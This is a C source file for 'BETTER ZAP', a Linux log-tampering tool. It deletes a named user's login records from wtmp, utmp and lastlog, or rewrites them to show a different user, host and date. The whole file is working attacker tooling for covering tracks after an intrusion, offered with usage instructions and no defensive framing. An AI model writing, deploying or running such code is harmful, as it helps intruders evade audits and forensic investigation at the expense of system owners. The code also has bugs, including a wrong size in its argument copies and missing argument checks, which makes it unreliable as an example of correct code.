/*
BETTER ZAP
Systems : Linux Ubuntu

Run:
    zap -A <username>

        - Deletes all logs related to <username>.

    zap -a <username> -t <host> -d <date>

        - Deletes all logs related to <username>, with terminal/host of <host>, within day <date>.
        - <date> should be in format of mmddyy.

    zap -R <username1> <username2> -t <host1> <host2> -d <date1> <date2>

        - Switch all logs of <username1> with <host1>, <date1> to <username2> with <host2>, <date2>.

*/
#define _XOPEN_SOURCE 700

#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <utmp.h>
#include <lastlog.h>
#include <pwd.h>
#include <string.h>
#include <time.h>


#define WHO_EQUAL 1
#define ALL_EQUAL 2
#define NOT_EQUAL 0

#define RECORD_LEN (sizeof(struct lastlog))

// check condition for utmp and condition entered by user.


int strnncmp(const char *s1, const char *s2, int A){
    return strncmp(s1, s2, strlen(s1)) + strncmp(s1, s2, strlen(s2));
}

int f;

int check_utmp_condition(struct utmp utmp_ent, char *who, char *host, char *mdy)
{

    // Format time to mmddyy, so arg can be same comparison

    time_t rawtime = utmp_ent.ut_tv.tv_sec;
    struct tm ts;
    char time_buf[7];
    ts = *localtime(&rawtime);
    strftime(time_buf, sizeof(time_buf), "%m%d%y", &ts);

    if (!strnncmp(utmp_ent.ut_name, who, strlen(utmp_ent.ut_name)))
    {
        if (!strnncmp(utmp_ent.ut_host, host, strlen(utmp_ent.ut_host)) && !strnncmp(time_buf, mdy, 6))
        {
            printf("CHECKING %s, %s %s %s ALL EQ\n", utmp_ent.ut_host, time_buf, host, mdy);
            return ALL_EQUAL;
        }
        else
        {
            printf("CHECKING %s, %s %s %s WHo EQ\n", utmp_ent.ut_host, time_buf, host, mdy);
            return WHO_EQUAL;
        }
    }
    return NOT_EQUAL;
}

void resolve_lastlog()
{
    struct lastlog bufll;
    struct lastlog null_record;
    memset(&null_record, 0, RECORD_LEN);

    if ((f = open("/var/log/lastlog", O_RDWR | __O_LARGEFILE)) >= 0)
    {
        int uid = 0;
        while (read(f, &bufll, RECORD_LEN) > 0)
        {
            if (memcmp((void *)&bufll, (void *)&null_record, RECORD_LEN))
            {
                
                char *name = "";
                struct passwd *pw = getpwuid((uid_t)uid);
                if (pw)
                {
                    name = pw->pw_name;
                }
                printf("%-10u  %s %-8s  %s\n", uid, name, bufll.ll_line, bufll.ll_host);
                
                // Search for log with record. 
                
                struct utmp utmp_ent;

                int32_t lastlogtime = 0;

                int fwt = 0;

                if ((fwt = open("/var/log/wtmp", O_RDWR)) >= 0)
                {
                    while (read(fwt, &utmp_ent, sizeof(utmp_ent)) > 0)
                    {
                        if (!strnncmp(utmp_ent.ut_user, name, strlen(utmp_ent.ut_user)))
                        {
                            if(lastlogtime < utmp_ent.ut_tv.tv_sec){
                                lastlogtime = utmp_ent.ut_tv.tv_sec;
                                bufll.ll_time = lastlogtime;
                                strncpy(bufll.ll_host, utmp_ent.ut_host, UT_HOSTSIZE - 1);
                            }
                        }
            
                    }
                    close(fwt);
                }

                bufll.ll_time = lastlogtime;

                if(lastlogtime == 0){
                    memset(&bufll, 0, RECORD_LEN);
                }
                
                lseek(f, -RECORD_LEN, SEEK_CUR);
                write(f, &bufll, RECORD_LEN);
                
                uid++;
            }
            else
            {
                off_t seeked_to = lseek(f, (off_t)(uid + 1) * RECORD_LEN, SEEK_SET);
                if (-1 == seeked_to)
                {
                    perror("lastlog: llseek()");
                    return;
                }
                off_t overran_by = seeked_to % RECORD_LEN;
                if (overran_by)
                {
                    if (-1 == lseek(f, -overran_by, SEEK_CUR))
                    {
                        perror("lastlog: llseek()");
                        return;
                    }
                }
                uid = seeked_to / RECORD_LEN;
            }
        }
        close(f);
    }
}

/*
struct lastlog
  {
#if __WORDSIZE_TIME64_COMPAT32
    int32_t ll_time;
#else
    __time_t ll_time;
#endif
    char ll_line[UT_LINESIZE];
    char ll_host[UT_HOSTSIZE];
  };
*/

void kill_tmp(char *fname, char *who, char *host, char *mdy, int condition)
{
    struct utmp utmp_ent;
    // make buffer of size of the file.

    if ((f = open(fname, O_RDWR)) >= 0)
    {

        int sz = lseek(f, 0, SEEK_END) + 1;
        lseek(f, 0, SEEK_SET);
        struct utmp *bufs;
        // printf("%d is length of file", sz);
        bufs = malloc(sz * 4);
        // printf("%d", sizeof(struct utmp));
        int ptr = 0;
        int len_loc = 0;
        while (read(f, &utmp_ent, sizeof(utmp_ent)) > 0)
        {
            if (check_utmp_condition(utmp_ent, who, host, mdy) != condition)
            {
                memcpy(bufs + len_loc, &utmp_ent, sizeof(utmp_ent));
                len_loc++;
            }
            ptr++;
        }
        // printf(" condition unmet : %d TOTAL %d,\n", len_loc + 1, ptr + 1);

        close(f);

        // open again, in write mode, dump all the buffer.

        f = open(fname, O_WRONLY | O_TRUNC);
        for (int j = 0; j < len_loc; j++)
        {

            write(f, bufs + j, sizeof(struct utmp));
            //lseek(f, sizeof(struct utmp), SEEK_CUR);
            printf("%d", j);
        }
        free(bufs);
        close(f);
    }
    else
    {
        printf("%s NOT FOUND!", fname);
    }
}

void rep_tmp(char *fname, char *who, char *host, char *mdy, char *who_att, char *host_att, char *mdy_att)
{
    struct utmp utmp_ent;
    // make buffer of size of the file.

    if ((f = open(fname, O_RDWR)) >= 0)
    {

        while (read(f, &utmp_ent, sizeof(utmp_ent)) > 0)
        {
            if (check_utmp_condition(utmp_ent, who, host, mdy) == ALL_EQUAL)
            {
                printf("FOUND\n");
                strncpy(utmp_ent.ut_user, who_att, UT_NAMESIZE - 1);
                strncpy(utmp_ent.ut_host, host_att, UT_HOSTSIZE - 1);

                struct tm ts;
                strptime(mdy_att, "%m%d%y",&ts);
                utmp_ent.ut_tv.tv_sec = mktime(&ts);
                lseek(f, -(sizeof(utmp_ent)), SEEK_CUR);
                write(f, &utmp_ent, sizeof(utmp_ent));
            }
            
        }
        close(f);
    }
}

char _who[UT_NAMESIZE]; // Zero initialized
char _host[UT_HOSTSIZE];
char _mdy[8];

char _who_att[UT_NAMESIZE]; // Zero initialized
char _host_att[UT_HOSTSIZE];
char _mdy_att[8];

int main(int argc, char *argv[])
{
    if (argv[1][0] == '-')
    {
        if (argv[1][1] == 'A')
        {
            // USERNAME MODE
            strncpy(_who, argv[2], sizeof(argv[2]));

            kill_tmp("/var/log/wtmp", _who, _host, _mdy, WHO_EQUAL);
            kill_tmp("/var/run/utmp", _who, _host, _mdy, WHO_EQUAL);
            resolve_lastlog();
        }
        if (argv[1][1] == 'a')
        {
            strncpy(_who, argv[2], sizeof(argv[2]));
            strncpy(_host, argv[4], sizeof(argv[4]));
            strncpy(_mdy, argv[6], sizeof(argv[6]));
            kill_tmp("/var/log/wtmp", _who, _host, _mdy, ALL_EQUAL);
            kill_tmp("/var/run/utmp", _who, _host, _mdy, ALL_EQUAL);
            resolve_lastlog();
        }
        if (argv[1][1] == 'R')
        {

            strncpy(_who, argv[2], sizeof(argv[2]));
            strncpy(_who_att, argv[3], sizeof(argv[3]));
            strncpy(_host, argv[5], sizeof(argv[5]));
            strncpy(_host_att, argv[6], sizeof(argv[6]));
            strncpy(_mdy, argv[8], sizeof(argv[8]));
            printf("INPUT %s\n", _mdy);
            strncpy(_mdy_att, argv[9], sizeof(argv[9]));
            rep_tmp("/var/log/wtmp", _who, _host, _mdy, _who_att, _host_att, _mdy_att);
            rep_tmp("/var/run/utmp", _who, _host, _mdy, _who_att, _host_att, _mdy_att);
            resolve_lastlog();

        }
    }
    else
    {
        printf("Error : Wrong argument");
    }
}